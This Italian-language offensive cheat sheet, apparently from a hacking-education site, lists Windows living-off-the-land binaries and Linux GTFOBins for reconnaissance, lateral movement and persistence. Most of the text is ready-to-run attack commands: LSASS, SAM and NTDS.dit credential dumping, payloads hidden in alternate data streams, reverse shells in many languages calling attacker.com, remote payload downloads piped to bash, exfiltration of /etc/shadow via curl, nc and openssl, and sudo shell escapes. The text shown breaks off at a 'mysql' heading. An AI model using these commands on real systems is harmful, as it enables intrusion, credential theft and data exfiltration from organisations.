`nltest.exe` interroga il servizio Netlogon. Rivela la struttura del dominio Active Directory (il sistema Microsoft per gestire centralmente tutti gli utenti, computer e permessi di una rete aziendale): quali domain controller (il server principale che gestisce tutti gli account e i computer del dominio aziendale) esistono, quali trust ha il dominio, a quale sito appartiene la macchina. Informazioni fondamentali per pianificare il lateral movement — spostarsi da un computer all'altro nella stessa rete aziendale.

```cmd
nltest /domain_trusts
nltest /dclist:domain.local
nltest /sc_query:domain.local
nltest /dsgetsite
nltest /user:"Administrator"
```

***

#### `whoami.exe`

Il comando più basilare — dice chi sei. Con i flag giusti mostra tutti i privilegi del token (un oggetto di Windows che rappresenta l'identità e i permessi dell'utente corrente — ogni processo ne ha uno) corrente e tutti i gruppi di appartenenza. `whoami /priv` è fondamentale per capire se ci sono privilegi abusabili per la privilege escalation — ottenere permessi più alti di quelli che si hanno (es. da utente normale a amministratore o root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema)).

```cmd
whoami /all
whoami /priv
whoami /groups
whoami /fqdn
```

***

#### `systeminfo.exe`

Mostra le informazioni di sistema: versione OS, patch installate, dominio. Le patch installate (HotFix) servono per identificare vulnerabilità non corrette — se manca una patch nota, c'è potenzialmente un exploit applicabile.

```cmd
systeminfo
systeminfo | findstr /B /C:"OS" /C:"Domain" /C:"Hotfix"
```

***

#### `ipconfig.exe` / `arp.exe` / `route.exe`

Tool di rete di base. `ipconfig /all` mostra configurazione IP e DNS. `arp -a` mostra gli host recentemente contattati. `route print` mostra le rotte di rete. Insieme danno una mappa della rete interna.

```cmd
ipconfig /all
arp -a
route print
netstat -ano
netstat -anob
netsh advfirewall firewall show rule name=all
```

***

#### `tasklist.exe`

Elenca i processi in esecuzione. Permette di vedere se ci sono antivirus, EDR (Endpoint Detection & Response — software di sicurezza avanzato usato dalle aziende, più sofisticato di un normale antivirus: analizza il comportamento dei programmi, non solo i file), o altri tool di sicurezza attivi — e di trovare il PID di processi interessanti come `lsass (il processo di Windows che tiene in memoria le password degli utenti loggati).exe` (che contiene le credenziali in memoria).

```cmd
tasklist /SVC
tasklist /v
tasklist /FI "IMAGENAME eq lsass.exe"
tasklist /m /fi "pid eq <PID>"
```

***

#### `wmic.exe`

Windows Management Instrumentation — uno strumento potentissimo per interrogare qualsiasi aspetto del sistema. Versione, processi, servizi, hardware, utenti, patch. È anche usabile in remoto se si hanno credenziali. Deprecato nelle versioni recenti di Windows ma ancora presente.

```cmd
wmic computersystem get name,domain,username
wmic process list full
wmic service list brief
wmic product get name,version
wmic logicaldisk get caption,freespace,size
wmic useraccount list full
wmic group list brief
wmic startup list full
wmic share list brief
wmic qfe get HotFixID,InstalledOn
wmic nicconfig where IPEnabled=True get IPAddress,MACAddress
wmic /node:192.168.1.10 process call create "whoami"
```

***

#### `dsquery.exe`

Interroga Active Directory (il sistema Microsoft per gestire centralmente tutti gli utenti, computer e permessi di una rete aziendale) tramite query LDAP (il protocollo usato per interrogare Active Directory e leggere informazioni su utenti e computer). In ambienti aziendali è il modo più diretto per enumerare utenti, computer, gruppi e la struttura del dominio. Richiede di essere su una macchina joinata al dominio.

```cmd
dsquery user -name * -limit 0
dsquery computer -limit 0
dsquery group -name "Domain Admins"
dsquery * -filter "(objectClass=group)" -attr cn members
dsquery * -filter "(&(objectClass=user)(adminCount=1))" -attr sAMAccountName
dsquery ou
dsquery site
```

***

#### `gpresult.exe`

Mostra le Group Policy (le regole di configurazione che un amministratore imposta centralmente per tutti i computer dell'azienda) applicate alla macchina e all'utente corrente. Utile per capire restrizioni attive (AppLocker (la funzione Windows che permette agli amministratori di bloccare l'esecuzione di certi programmi), script policy, diritti) e trovare configurazioni che possono essere aggirate.

```cmd
gpresult /r
gpresult /h C:\Temp\gpreport.html
gpresult /z > C:\Temp\gpfull.txt
```

***

### Lateral Movement

#### `wmic.exe` (remoto)

`wmic.exe` supporta connessioni remote. Con credenziali valide si possono eseguire comandi su altre macchine del dominio senza installare nulla — è come avere un `exec` remoto usando strumenti di sistema.

```cmd
wmic /node:192.168.1.10 /user:DOMAIN\Admin /password:Password1 process call create "cmd.exe /c whoami > C:\output.txt"
wmic /node:@computerlist.txt /user:DOMAIN\Admin /password:Password1 process call create "payload.exe"
```

***

#### `sc.exe` (remoto)

`sc.exe` può gestire servizi anche su macchine remote — basta specificare `\\IP`. Si crea un servizio temporaneo, lo si avvia per eseguire il comando, poi lo si cancella. Tecnica classica di lateral movement — spostarsi da un computer all'altro nella stessa rete aziendale con credenziali.

```cmd
sc \\192.168.1.10 create EvilSvc binpath= "cmd.exe /c whoami > C:\output.txt"
sc \\192.168.1.10 start EvilSvc
sc \\192.168.1.10 delete EvilSvc
```

***

#### `schtasks.exe` (remoto)

Come per `sc.exe`, anche `schtasks.exe` supporta l'esecuzione remota con il flag `/s`. Si crea un task pianificato sulla macchina remota, si esegue, si cancella. Lascia tracce nei log degli eventi.

```cmd
schtasks /create /s 192.168.1.10 /u DOMAIN\Admin /p Password1 /tn "Task" /tr "cmd.exe /c whoami" /sc once /st 00:00
schtasks /run /s 192.168.1.10 /u DOMAIN\Admin /p Password1 /tn "Task"
schtasks /delete /s 192.168.1.10 /u DOMAIN\Admin /p Password1 /tn "Task" /f
```

***

#### `mstsc.exe`

`mstsc.exe` è il client RDP (Remote Desktop). Se si hanno le credenziali, è il metodo più diretto e silenzioso per accedere graficamente a un altro sistema. Con `cmdkey` si salvano le credenziali in memoria per non doverle reinserire.

```cmd
cmdkey /generic:192.168.1.10 /user:DOMAIN\Admin /pass:Password1
mstsc /v:192.168.1.10
```

***

#### `winrs.exe`

Windows Remote Shell — funziona tramite WinRM (Windows Remote Management — il protocollo Microsoft per gestire macchine Windows da remoto, simile a SSH) (porta 5985/5986). È come SSH per Windows: esegui un comando su una macchina remota e ottieni l'output. Richiede che WinRM sia abilitato sulla macchina target (spesso lo è negli ambienti aziendali).

```cmd
winrs -r:http://192.168.1.10:5985 -u:DOMAIN\Admin -p:Password1 "cmd /c whoami"
winrs -r:192.168.1.10 -u:DOMAIN\Admin -p:Password1 "powershell -nop -w hidden -e <base64>"
```

***

#### `at.exe`

`at.exe` è lo scheduler legacy di Windows (sostituito da `schtasks`). È ancora presente su molti sistemi e supporta l'esecuzione remota. Spesso meno monitorato di `schtasks`.

```cmd
at \\192.168.1.10 23:59 "cmd /c C:\Temp\payload.exe"
```

***

### Credential Access & Dumping

#### LSASS (Local Security Authority Subsystem — il processo Windows che tiene in memoria le credenziali di tutti gli utenti attualmente loggati) dump — `comsvcs.dll` (senza Mimikatz)

LSASS (Local Security Authority Subsystem) è il processo Windows che gestisce le credenziali — ha in memoria le password degli utenti loggati. Fare il "dump" significa creare una copia di quel processo per estrarne le credenziali offline. Mimikatz è il tool classico ma viene bloccato subito. Usando `rundll32.exe` con `comsvcs.dll` (entrambi firmati Microsoft) si ottiene lo stesso risultato con meno rumore.

```cmd
tasklist | findstr lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
```

Analisi offline:

```bash
python3 pypykatz lsa minidump lsass.dmp
```

***

#### `reg.exe` — SAM dump

SAM (Security Account Manager) è il database locale delle password di Windows. Normalmente è bloccato dal sistema operativo mentre è in uso. Con `reg save` si può esportare una copia che poi si analizza offline con tool come `secretsdump.py` di Impacket per recuperare gli hash NTLM (un protocollo di autenticazione Windows — manda la password in forma cifrata, che può essere catturata e riutilizzata) (la password cifrata dell'utente, recuperabile dalla memoria).

```cmd
reg save HKLM\sam C:\Temp\sam
reg save HKLM\system C:\Temp\system
reg save HKLM\security C:\Temp\security
```

```bash
impacket-secretsdump -sam sam -security security -system system LOCAL
```

***

#### `vssadmin.exe` — NTDS.dit (il file database di Active Directory — contiene le password cifrate di tutti gli utenti dell'intera rete aziendale)

`ntds.dit` è il database di Active Directory (il sistema Microsoft per gestire centralmente tutti gli utenti, computer e permessi di una rete aziendale) — contiene gli hash delle password di TUTTI gli utenti del dominio. Non è accessibile direttamente perché è sempre in uso. La soluzione: creare una Shadow Copy (una copia snapshot del disco — Windows la usa per i backup, ma permette anche di leggere file normalmente bloccati dal sistema) (backup del volume) e copiare il file da lì. `vssadmin` gestisce le Shadow Copy (un backup istantaneo del disco che Windows crea — permette di leggere file altrimenti bloccati perché in uso) — è uno strumento legittimo di backup.

```cmd
vssadmin create shadow /for=C:
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" C:\Temp\ntds.dit
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\Temp\SYSTEM
vssadmin delete shadows /for=C: /quiet
```

***

#### `ntdsutil.exe`

Tool ufficiale Microsoft per la gestione di Active Directory (il sistema Microsoft per gestire centralmente tutti gli utenti, computer e permessi di una rete aziendale). La funzione `ifm` (Install From Media) crea un backup del database AD. È esattamente quello che vogliamo — e visto che è uno strumento di amministrazione legittimo, viene spesso ignorato dai sistemi di monitoring.

```cmd
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\NTDS" q q
```

***

### Alternate Data Streams — una funzionalità del filesystem NTFS (il filesystem standard di Windows) di Windows: ogni file può avere dati "nascosti" aggiuntivi, invisibili in Esplora File e con il normale comando `dir` (ADS)

NTFS supporta stream multipli per ogni file. Utile per nascondere payload.

```cmd
echo "payload" > C:\Temp\legit.txt:hidden.exe
type C:\Temp\payload.exe > C:\Temp\legit.txt:payload.exe
wscript C:\Temp\legit.txt:script.vbs
dir /r C:\Temp\legit.txt
more < C:\Temp\legit.txt:hidden.exe
powershell -command "Get-Item -stream * C:\Temp\legit.txt"
```

***

### LOLScripts

#### `PubPrn.vbs`

VBS firmato Microsoft. Esegue codice da URL remoto.

`PubPrn.vbs` è un VBScript Microsoft per la gestione delle stampanti. È firmato digitalmente (cioè Microsoft o il vendor ha messo la sua "firma" sul file, garantendone l'autenticità — gli antivirus tendono a fidarsi dei file firmati). Il trucco: accetta un parametro `script:URL` che viene eseguito tramite COM. Consente di eseguire uno script remoto usando un file VBS già presente nel sistema.

```cmd
cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 "script:http://attacker.com/payload.sct"
```

***

## Linux — GTFOBins completi

Fonte: [GTFOBins ](https://gtfobins.github.io), puoi anche leggere il nostro articolo completo [qui](https://hackita.it/articoli/gtfobins/).

***

### Shell & Reverse Shell

#### `bash` — senza netcat

La reverse shell (una connessione che parte dal computer della vittima verso il computer dell'attaccante — dà controllo remoto della macchina senza dover aprire porte in entrata) più semplice su Linux. `/dev/tcp/` è una funzionalità di bash che apre una connessione TCP come se fosse un file. Redirigendo stdin/stdout/stderr su quella connessione, si ottiene una shell interattiva verso il server dell'attaccante. Nessun tool esterno, nessun binario extra — solo bash.

```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
exec 5<>/dev/tcp/attacker.com/4444; cat <&5 | while read l; do $l 2>&5 >&5; done
```

***

#### `sh` / `dash` / `zsh` / `ksh` / `csh`

Varianti della shell. `dash` è la shell di default su Ubuntu per gli script di sistema. `zsh` è popolare su macOS e sistemi moderni. Ognuna ha il suo modo per aprire una connessione di rete — utile quando `bash` non è disponibile o è bloccato.

```bash
sh -i >& /dev/tcp/attacker.com/4444 0>&1
zsh -c 'zmodload zsh/net/tcp && ztcp attacker.com 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
csh -c 'set sock = /dev/tcp/attacker.com/4444; bash <& $sock >& $sock 2>&1'
```

***

#### `python3` / `python2`

Python è quasi sempre installato su sistemi Linux/macOS. Con il modulo `socket` si costruisce una reverse shell (una connessione che parte dal computer della vittima verso il computer dell'attaccante — dà controllo remoto della macchina senza dover aprire porte in entrata) completa in una riga. La libreria standard Python è sufficiente — nessuna dipendenza da installare.

```bash
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("attacker.com",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
python2 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("attacker.com",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
```

***

#### `perl`

Perl è sempre installato sui sistemi Unix. `exec "/bin/sh"` dentro un processo perl con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi) è sufficiente per ottenere una shell root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema).

```bash
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'
```

***

#### `ruby`

Come Python e Perl, `exec` in Ruby sostituisce il processo corrente con il comando specificato. Se Ruby è sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi)-able, si ottiene una shell root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema).

```bash
ruby -rsocket -e'f=TCPSocket.open("attacker.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

***

#### `php`

PHP CLI è presente su quasi tutti i server web Linux. Con `-r` si esegue codice PHP inline. `system()` esegue comandi di sistema con i privilegi dell'utente che ha lanciato PHP.

```bash
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("attacker.com",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

***

#### `node` / `nodejs`

Node.js è diffuso su server applicativi e macchine di sviluppo. Il modulo `net` è built-in. Utile in ambienti JavaScript/Node.

```bash
node -e 'var net=require("net"),sh=require("child_process").exec("/bin/sh");var c=net.connect(4444,"attacker.com",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});'
```

***

#### `awk` / `gawk` / `mawk` / `nawk`

`awk` è un linguaggio di elaborazione testo presente su praticamente tutti i sistemi Unix. In pochi lo sanno, ma supporta connessioni di rete tramite `/inet/tcp/`. Una reverse shell (una connessione che parte dal computer della vittima verso il computer dell'attaccante — dà controllo remoto della macchina senza dover aprire porte in entrata) in awk funziona anche sui sistemi più minimali.

```bash
awk 'BEGIN {s = "/inet/tcp/0/attacker.com/4444"; while(42) { do{ printf "$ " |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

***

#### `nc` / `netcat`

Netcat è il "coltellino svizzero della rete". La versione con `-e` esegue un programma sulla connessione TCP. Dove `-e` non è disponibile (versione BSD), si usa la tecnica con `mkfifo (crea una named pipe su Linux — un canale bidirezionale tra processi, usato per costruire shell senza netcat)` (named pipe (un canale di comunicazione interno a Windows, usato per passare dati tra processi)) per costruire una shell bidirezionale.

```bash
nc -e /bin/sh attacker.com 4444
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 4444 > /tmp/f
```

***

#### `socat`

`socat` è un netcat potenziato. Supporta TLS, pty (pseudo-terminale — necessario per avere una shell veramente interattiva) (pseudo-terminale (simula un terminale reale — necessario per comandi interattivi come editor, sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi) con password, ecc.)) e molto altro. La variante con `pty,stderr,setsid,sigint,sane` crea una shell completamente interattiva — supporta Ctrl+C, colori, completamento automatico.

```bash
socat TCP:attacker.com:4444 EXEC:/bin/sh
socat TCP:attacker.com:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

***

#### `ncat` (nmap)

`ncat` viene con il pacchetto `nmap`. È più moderno di `nc` e supporta `-e` in tutte le versioni. Spesso presente su macchine dove nmap è installato.

```bash
ncat attacker.com 4444 -e /bin/bash
```

***

#### `telnet`

`telnet` è ancora presente su molti sistemi Linux. Usando le named pipe (un canale di comunicazione interno a Windows, usato per passare dati tra processi) (`mkfifo (crea una named pipe su Linux — un canale bidirezionale tra processi, usato per costruire shell senza netcat)`) si costruisce una connessione bidirezionale — una reverse shell (una connessione che parte dal computer della vittima verso il computer dell'attaccante — dà controllo remoto della macchina senza dover aprire porte in entrata) senza `nc` né `bash /dev/tcp`.

```bash
TF=$(mktemp -u); mkfifo $TF && telnet attacker.com 4444 0<$TF | /bin/sh 1>$TF
```

***

#### `lua` / `luajit`

Lua è presente su alcuni sistemi embedded e server di gioco. Il modulo `socket` è spesso disponibile. Alternativa utile quando Python non c'è.

```bash
lua -e "require('socket');t=socket.tcp();t:connect('attacker.com','4444');while true do local r=t:receive();local f=io.popen(r,'r');local b=f:read('*a');t:send(b);end"
```

***

#### `erlang` / `erl`

Erlang è usato in ambienti di telecomunicazioni e sistemi distribuiti. Poco comune ma presente in certi server. `os:cmd` esegue shell commands.

```bash
erl -noshell -eval 'os:cmd("bash -i >& /dev/tcp/attacker.com/4444 0>&1").'
```

***

#### `irb` (Ruby Interactive)

IRB è la console interattiva di Ruby. Se si ottiene accesso a IRB, `exec` spawna una shell — uscendo dall'ambiente ristretto del REPL.

```bash
irb
exec "/bin/sh"
```

***

#### `jjs` (Java nashorn — JDK 8)

`jjs` è l'interprete JavaScript del JDK 8 (Nashorn engine). Su macchine con Java 8, permette di eseguire comandi di sistema tramite `java.lang.Runtime`.

```bash
jjs -e 'var r=java.lang.Runtime.getRuntime();var p=r.exec("/bin/sh");'
```

***

#### `jrunscript`

Tool incluso nel JDK che esegue script JavaScript o altri linguaggi. Presente su qualsiasi macchina con Java Development Kit.

```bash
jrunscript -e 'var r=java.lang.Runtime.getRuntime();r.exec(["/bin/bash","-c","bash -i >& /dev/tcp/attacker.com/4444 0>&1"]);'
```

***

#### `gdb`

GDB è il debugger GNU, presente su praticamente tutti i sistemi Linux con strumenti di sviluppo. Supporta Python come linguaggio di scripting interno — `python import os; os.execv(...)` spawna una shell con i privilegi di chi sta debuggando.

```bash
gdb -q -nx -ex 'python import os; os.execv("/bin/sh", ["/bin/sh"])' -ex quit
```

***

#### `expect`

`expect` automatizza interazioni con terminali interattivi (es. SSH, ftp). Supporta `spawn` e `interact` — con questi si avvia una shell e ci si connette interattivamente.

```bash
expect -c 'spawn /bin/sh; interact'
```

***

#### `tclsh` / `wish`

Tcl è un linguaggio di scripting ancora presente su molti sistemi Unix, specialmente server e apparati di rete. `socket` è built-in in Tcl. `wish` è la versione con interfaccia grafica.

```bash
echo 'set s [socket attacker.com 4444]; fconfigure $s -translation binary -buffering full; exec /bin/sh << "" >@ $s 2>@ $s' | tclsh
```

***

#### `screen`

`screen` è un multiplexer di terminale. Utile per persistenza di sessione: se si crea una sessione `screen` con una shell, quella shell sopravvive alla disconnessione.

```bash
screen -dmS session /bin/sh
screen -r session
```

***

#### `tmux`

Come `screen`, `tmux` è un multiplexer. Più moderno e diffuso. Una sessione tmux in background con una shell permette di riconnettersi alla sessione in qualsiasi momento.

```bash
tmux new-session -d -s sess '/bin/sh'
tmux send-keys -t sess 'id' Enter
```

***

### Download e upload

#### `curl`

`curl` è quasi sempre presente. Scarica file, invia dati verso server remoti. Con `-F` si può esfiltrare (copiare dati fuori dalla rete della vittima verso un server controllato dall'attaccante) un file come form upload — simula una normale richiesta HTTP POST, difficile da distinguere dal traffico legittimo.

```bash
curl http://attacker.com/payload.sh -o /tmp/payload.sh
curl http://attacker.com/payload.sh | bash
curl -F "data=@/etc/passwd" http://attacker.com/exfil
curl -T /etc/passwd ftp://attacker.com/
```

***

#### `wget`

`wget` è il download tool standard di Linux. Con `--post-file` invia il contenuto di un file verso un URL — esfiltrazione (copia di dati sensibili verso l'esterno, verso un server controllato dall'attaccante) tramite HTTP POST senza tool aggiuntivi.

```bash
wget http://attacker.com/payload.sh -O /tmp/payload.sh
wget -q -O - http://attacker.com/payload.sh | bash
wget --post-file=/etc/passwd http://attacker.com/exfil
```

***

#### `python3` — HTTP server

Python può avviare un server HTTP in una riga. Utile in due direzioni: servire file dall'attaccante verso la vittima, o esfiltrare (copiare dati fuori dalla rete della vittima verso un server controllato dall'attaccante) file dalla vittima esponendoli su una porta.

```bash
python3 -m http.server 8080
python3 -m http.server 8080 --bind 0.0.0.0
```

***

#### `base64` — esfiltrazione (copia di dati sensibili verso l'esterno, verso un server controllato dall'attaccante)

Encodare in Base64 prima di esfiltrare (copiare dati fuori dalla rete della vittima verso un server controllato dall'attaccante) è una tecnica classica: trasforma binari o file con caratteri speciali in testo ASCII puro, facilmente trasmissibile via HTTP, DNS, o email.

```bash
base64 /etc/shadow | curl -d @- http://attacker.com/exfil
cat /etc/passwd | base64 > /tmp/exfil.b64
```

***

#### `xxd`

`xxd` converte file in rappresentazione esadecimale e viceversa. Utile per trasmettere binari su canali che accettano solo testo, e per ricostruire file ricevuti in hex.

```bash
xxd /etc/shadow | nc attacker.com 4444
xxd -r -p encoded.hex > decoded.bin
```

***

#### `scp` / `sftp`

Se SSH è disponibile, `scp` copia file direttamente tra macchine tramite SSH. `sftp` è la versione interattiva. Comunicazione cifrata, quasi impossibile da distinguere da SSH legittimo.

```bash
scp root@target:/etc/shadow /tmp/shadow
sftp user@attacker.com <<< "put /etc/passwd"
```

***

#### `rsync`

`rsync` supporta `-e` per specificare una shell personalizzata per le connessioni SSH. Con `sh -c "sh 0<&2 1>&2"` come shell, si ottiene una shell interattiva con i privilegi di sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi).

```bash
rsync -avz /etc/ attacker.com:/loot/
rsync -e "ssh -i /root/.ssh/id_rsa" /etc/shadow user@attacker.com:/loot/
```

***

#### `aria2c`

Download manager multi-protocollo. Supporta HTTP, FTP, BitTorrent. Presente su molti server Linux come alternativa a `wget`.

```bash
aria2c http://attacker.com/payload.sh
aria2c --out=/tmp/payload http://attacker.com/payload.sh
```

***

#### `tftp`

TFTP (Trivial FTP) è un protocollo di trasferimento file senza autenticazione, molto semplice. Il client è presente su molti sistemi Linux. Utile in ambienti dove HTTP è bloccato ma UDP/TFTP no.

```bash
tftp attacker.com <<< "get payload.sh /tmp/payload.sh"
```

***

#### `ftp`

Il client FTP interattivo supporta comandi `!` per eseguire shell commands locali. Se `ftp` è sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi)-able, `!` dentro la sessione FTP spawna una shell root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema).

```bash
ftp attacker.com << EOF
binary
get payload.sh /tmp/payload.sh
bye
EOF
```

***

#### `git`

`git` ha un pager integrato (usa `less` per default). Forzando bash come pager con `GIT_PAGER=bash`, quando git visualizza output, apre bash invece di less — con i privilegi di sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi).

```bash
git clone http://attacker.com/repo /tmp/repo
git -C /tmp/loot init && git -C /tmp/loot add . && git -C /tmp/loot commit -m "x" && git -C /tmp/loot push http://attacker.com/repo main
```

***

#### `pip` / `pip3`

`pip` installa pacchetti Python. Un pacchetto Python può contenere codice arbitrario nello script `setup.py` o `postinst` — che viene eseguito durante l'installazione. Tecnica usata in attacchi supply chain.

```bash
pip download http://attacker.com/package.whl -d /tmp/
pip install http://attacker.com/malicious_package-1.0.tar.gz
```

***

#### `openssl`

`openssl` è quasi sempre presente. Con `s_client` si apre una connessione TLS/SSL verso un server — le comunicazioni sono cifrate e difficili da ispezionare con DPI (Deep Packet Inspection).

```bash
openssl s_client -connect attacker.com:4444 | /bin/sh | openssl s_client -connect attacker.com:4445
cat /etc/shadow | openssl enc -base64 | curl -d @- http://attacker.com/exfil
```

***

### Privilege Escalation via sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi)

> 📌 Approfondisci con il nostro articolo su [Privilege Escalation Linux](https://hackita.it/articoli/privilege-escalation-linux)

#### `vim` / `vi` / `nano`

Se un editor di testo può essere eseguito con `sudo`, si può aprire una shell da dentro l'editor — che girerà con i privilegi di root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema). In `vim`: `:!/bin/sh`. In `nano`: CTRL+R, CTRL+X. Semplice ma efficacissimo.

```bash
sudo vim -c ':!/bin/sh'
sudo vi -c ':!/bin/bash'
# In nano: CTRL+R, CTRL+X, poi:
reset; sh 1>&0 2>&0
```

***

#### `find`

`find` cerca file nel filesystem. Il flag `-exec` esegue un comando per ogni file trovato. Se `find` ha `sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi)`, `-exec /bin/sh` spawna una shell root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema). Bastano tre parole: `sudo find . -exec /bin/sh \;`.

```bash
sudo find . -exec /bin/sh \; -quit
sudo find / -name "*.log" -exec /bin/sh -c "id; /bin/sh" \;
```

***

#### `awk`

`awk` ha una funzione `system()` che esegue comandi di shell. Se `awk` è sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi)-able, `sudo awk 'BEGIN {system("/bin/sh")}'` è tutto ciò che serve per una shell root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema).

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

***

#### `python3`

Come per gli altri interpreti, se Python è eseguibile con `sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi)`, `os.system("/bin/sh")` dentro Python gira come root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema). Una delle escalation più immediate e diffuse.

```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
```

***

#### `less` / `more` / `pg`

`less` e `more` mostrano file di testo a schermo. Mentre si è dentro il pager, digitare `!` seguito da un comando lo esegue. Se `less` gira come root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema) (via sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi)), il comando viene eseguito come root.

```bash
sudo less /etc/passwd
!/bin/sh

sudo more /etc/hosts
!/bin/sh
```

***

#### `env`

`env` imposta variabili d'ambiente ed esegue un programma. Se `sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi) env /bin/sh` è permesso, si ottiene una shell root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema). La variante con `PAGER` sfrutta il pager che `man` usa internamente.

```bash
sudo env /bin/sh
sudo env PAGER='sh -c "exec sh 0<&1"' man ls
```

***

#### `tar`

`tar` supporta i "checkpoint actions" — esegue un comando dopo ogni N blocchi processati. `--checkpoint-action=exec=/bin/sh` spawna una shell al primo checkpoint. Classico esempio di funzionalità legittima abusabile.

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

***

#### `zip` / `unzip`

`zip` ha un flag `--unzip-command` che specifica quale programma usare per estrarre. Passare `/bin/sh` come comando di estrazione spawna una shell.

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T --unzip-command="sh -c /bin/sh"
sudo unzip -p payload.zip | bash
```

***

#### `gcc`

Il compilatore C supporta `-wrapper` per specificare un wrapper da eseguire intorno al compilatore stesso. Con `/bin/sh,-s` come wrapper, il compilatore spawna una shell interattiva.

```bash
sudo gcc -wrapper /bin/sh,-s .
```

***

#### `strace`

`strace` traccia le system call di un processo. Con `-o /dev/null` non scrive output, ma il processo che lancia è `/bin/sh` — con i privilegi di chi esegue strace.

```bash
sudo strace -o /dev/null /bin/sh
```

***

#### `nmap` (versioni vecchie ≤ 5.x)

Nmap ha uno scripting engine (NSE) che esegue script Lua. Nelle versioni vecchie (≤5.x), `os.execute` è disponibile negli script NSE. Si scrive uno script che chiama `/bin/sh` e si esegue con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi).

```bash
echo "os.execute('/bin/sh')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

***

#### `ed` / `ex`

`ed` è un editor di testo a riga di comando degli anni '70, ancora presente su tutti i sistemi Unix. Il comando `!` dentro `ed` esegue comandi di shell — con i privilegi di chi ha lanciato `ed`.

```bash
sudo ed
!/bin/sh

sudo ex -c '!id' -c 'q!' /etc/hosts
```

***

#### `emacs`

Emacs è un editor di testo con un interprete Elisp embedded. Se eseguibile con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi), `M-x term` o `M-x shell` apre un terminale che gira come root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema).

```bash
sudo emacs -Q -nw --eval '(term "/bin/sh")'
```

***

#### `perl`

```bash
sudo perl -e 'exec "/bin/sh";'
```

***

#### `git`

```bash
sudo git -p help config
!/bin/sh

sudo GIT_PAGER=bash git log --no-walk
```

***

#### `man`

`man` usa `less` come pager. Come visto sopra, da dentro `less` si può eseguire comandi con `!`. Se `man` gira con sudo (comando Linux che permette di eseguire un programma con i privilegi di root — se mal configurato, può essere abusato per scalare i privilegi), il terminale aperto con `!` è root (l'utente con i massimi privilegi su Linux — può fare qualsiasi cosa sul sistema).

```bash
sudo man man
!/bin/sh
```

***

#### `ftp`

```bash
sudo ftp
!/bin/sh
```

***

#### `mysql`

